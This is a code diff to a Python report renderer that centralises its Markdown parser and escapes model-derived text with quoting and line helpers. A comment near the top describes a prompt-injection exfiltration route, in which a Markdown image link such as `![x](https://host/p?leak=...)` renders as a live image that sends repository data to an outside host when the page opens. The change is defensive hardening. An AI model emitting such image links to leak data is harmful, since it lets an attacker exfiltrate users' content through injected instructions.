@@ -9,16 +9,14 @@ on surprises, amber "on purpose" badges on absences.
 import html as _html
 import os
 
-from crawl.core.render import md_cell, md_heading
+from crawl.core.render import markdown_parser, md_cell, md_heading, md_line, md_quote
 
 from markdown_it import MarkdownIt
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
-_MD = MarkdownIt(
-    "commonmark", {"html": False, "linkify": False, "breaks": False}
-).enable(["table"]).disable("image")
+_MD = markdown_parser()
 
 
 def md(text):
@@ -499,19 +497,19 @@ def render_markdown(name, shared):
     parts.append("_A product story reverse engineered from the codebase._\n")
 
     parts.append("## The pitch\n")
-    parts.append(f"> {shared['variant']}\n")
+    parts.append(md_quote(shared['variant']) + "\n")
 
     parts.append("## The pain\n")
-    parts.append(f"> {shared['pain']}\n")
+    parts.append(md_quote(shared['pain']) + "\n")
 
     parts.append("## Where it sits\n")
     parts.append("### What it gives up\n")
     for s in positioning.get("sacrifices", []):
-        parts.append(f"- {s}")
+        parts.append(f"- {md_line(s)}")
     parts.append("")
     parts.append("### What it gets in return\n")
     for g in positioning.get("gains", []):
-        parts.append(f"- {g}")
+        parts.append(f"- {md_line(g)}")
     parts.append("")
     parts.append("### Why incumbents can't copy this\n")
     parts.append(positioning.get("why_incumbents_cannot_copy", "").strip() + "\n")
